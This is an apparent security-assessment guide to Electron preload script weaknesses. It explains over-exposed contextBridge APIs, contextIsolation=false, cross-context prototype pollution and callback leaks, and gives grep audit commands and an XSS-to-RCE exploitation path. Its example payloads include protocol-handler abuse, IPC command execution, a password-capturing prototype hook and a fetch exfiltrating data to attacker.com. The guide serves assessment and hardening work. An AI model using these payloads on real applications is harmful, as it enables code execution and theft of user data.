---
title: Preload Script Bypass
description: Techniques to circumvent preload script security controls and access privileged APIs from the web context
---

# Preload Script Bypass

"Preload bypass" covers a range of techniques that let an attacker access privileged APIs the preload wasn't intended to expose. The term is a bit misleading — in most cases, the preload's `contextBridge` implementation is technically correct. The vulnerability is in what it exposes, not how it exposes it.

The most common variant isn't a bypass at all: it's an over-privileged bridge design where the preload exposes more than the page needs. An attacker who finds XSS just calls the exposed API with malicious arguments.

---

## Category 1: Over-Exposed APIs (The Common Case)

The preload is correctly implemented, but the API surface is too broad:

```javascript
// preload.js — contextBridge is used correctly, but:
contextBridge.exposeInMainWorld('api', {
  // "Intended" to open links — actually opens ANY URL scheme:
  openExternal: (url) => shell.openExternal(url),  // no scheme validation
  
  // "Intended" to send app messages — actually sends to ANY channel:
  send: (channel, data) => ipcRenderer.send(channel, data)  // no allowlist
});

// XSS:
window.api.openExternal('ms-msdt://...');  // protocol handler abuse
window.api.send('exec-system-command', 'calc.exe');  // arbitrary IPC
```

This isn't a contextBridge flaw. contextBridge is doing exactly what it's designed to do. The flaw is that the developer didn't consider what an attacker with XSS would do with the exposed API.

---

## Category 2: contextIsolation=false (Technical Bypass)

When `contextIsolation: false`, the preload and page share a V8 context. Anything the preload puts on `window` or `global` is accessible to page JS and XSS:

```javascript
// preload.js (contextIsolation: false):
const { ipcRenderer } = require('electron');
window._app = {
  doInternalThing: (data) => ipcRenderer.invoke('internal-channel', data)
};
// _app was meant as "internal" — but with no isolation, XSS can call it

// XSS:
window._app.doInternalThing({ cmd: 'calc.exe' });
// Or, if ipcRenderer itself leaked to window scope:
ipcRenderer.invoke('exec-command', 'calc.exe');
```

With `contextIsolation: false`, there's no security value in the bridge — page and preload are the same context. XSS gets everything.

---

## Category 3: Prototype Pollution Across Contexts

Only relevant with `contextIsolation: false` — shared context means shared prototype chains:

```javascript
// XSS payload poisons preload's function calls:
const originalCall = Function.prototype.call;
Function.prototype.call = function(thisArg, ...args) {
  // Intercept every function call in the preload's context too:
  if (JSON.stringify(args).includes('password')) {
    exfiltrate(args);
  }
  return originalCall.apply(this, [thisArg, ...args]);
};
```

This is why `contextIsolation: true` matters: separate V8 worlds mean separate prototype chains. Poisoning one doesn't affect the other.

---

## Category 4: Callback Exfiltration

When preloads expose event listeners that accept callbacks from the page, the callback receives data from the main process — which the page isn't supposed to see directly:

```javascript
// preload.js:
contextBridge.exposeInMainWorld('api', {
  // Exposes a way to subscribe to IPC messages:
  onUpdate: (callback) => {
    ipcRenderer.on('update-data', (_event, data) => callback(data));
  }
});

// XSS — registers malicious callback:
window.api.onUpdate((data) => {
  // data comes from main process — may contain credentials, private state
  fetch('https://attacker.com/exfil?d=' + encodeURIComponent(JSON.stringify(data)));
});
```

The preload correctly gates IPC access — only the specific channel is exposed, not a raw relay. But if that channel carries sensitive data, the callback mechanism is still a leak.

---

## Finding These During an Assessment

```bash
# Read all preload scripts:
grep -rn "preload:" --include="*.js" . | grep -v node_modules
# Then read each file manually

# Look for over-exposed functions (accept arbitrary arguments):
grep -r "exposeInMainWorld" --include="*.js" . -A 30 | \
  grep -E "\(url|path|cmd|command|channel|script\b" | grep -v node_modules

# Look for relay patterns (any channel, any args):
grep -r "ipcRenderer\.\(send\|invoke\)" --include="*.js" . | \
  grep -v "'[^']*'\|\"[^\"]*\"" | grep -v node_modules
# Lines without string literals are accepting dynamic channel names

# Find contextIsolation: false:
grep -r "contextIsolation.*false" --include="*.js" . | grep -v node_modules
```

---

## Exploitation Path

1. Confirm `contextIsolation` state
   - `false` → XSS accesses all preload `window` assignments directly
   - `true` → XSS limited to what's in `exposeInMainWorld`

2. Enumerate the exposed API surface:
   - Look for functions accepting arbitrary URLs, paths, or commands
   - Look for arbitrary IPC channel relay patterns
   - Look for callback subscriptions that receive main-process data

3. Find XSS in the renderer

4. Call the over-privileged API from XSS payload

5. Trace through IPC to the dangerous main process operation

The chain from XSS to RCE via an over-exposed preload API is typically two or three steps. The preload bypass itself (finding the right API to call) is often the easiest part — it's written right there in the preload script.
